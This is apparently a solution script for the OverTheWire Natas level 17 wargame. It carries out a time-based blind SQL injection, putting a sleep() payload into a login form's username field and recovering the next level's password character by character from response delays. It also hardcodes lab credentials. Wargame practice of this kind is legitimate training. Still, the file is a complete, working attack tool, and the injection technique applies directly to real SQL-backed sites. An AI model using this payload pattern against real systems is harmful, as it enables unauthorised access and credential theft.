#!/usr/bin/python3

import requests
import time
from string import ascii_letters, digits

USERNAME = "natas18"
BASE_URL = "http://natas17.natas.labs.overthewire.org"
AUTHENTICATION = {'username': 'natas17',
                  'password': '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'}
TIME_SLEEP_VALUE = 5


def create_post_request_data(first_characters_in_password: str) -> dict:
    """
    Creates a POST request data, which includes username property.
    """
    # sleep 5 sec if username is natas18 and password starts with given characters (case sensitive)
    data = {'username': "{0}\" and password LIKE BINARY \"{1}%\" and sleep({2}) #".format(
        USERNAME, first_characters_in_password, TIME_SLEEP_VALUE)}
    return data


def is_valid_url(url: str, data: dict) -> bool:
    """
    Check if the given url returns the expected output.
    """
    session = requests.Session()
    session.auth = (AUTHENTICATION['username'], AUTHENTICATION['password'])

    # measure response time
    start = time.time()
    response = session.post(url=url, data=data)
    _ = response.text
    finish = time.time()

    seconds_elapse = int((finish - start) % 60)
    return seconds_elapse >= TIME_SLEEP_VALUE


def run_brute_force() -> str:
    """
    Starts brute force and return result.
    """
    characters_in_password = []
    possible_characters = ascii_letters + digits

    for _ in range(0, 64):
        found_valid_letter = False

        # go through all ascii letters (a-z A-Z) and numbers (0-9)
        for c in possible_characters:
            query = create_post_request_data(''.join(characters_in_password) + c)
            if is_valid_url(BASE_URL, query):
                characters_in_password.append(c)
                found_valid_letter = True
                break

        # If there is no valid letter found break
        if not found_valid_letter:
            break

    return ''.join(characters_in_password)


def main():
    print("Starting brute force...")
    password = run_brute_force()
    print("Brute force result:", password)


if __name__ == "__main__":
    main()
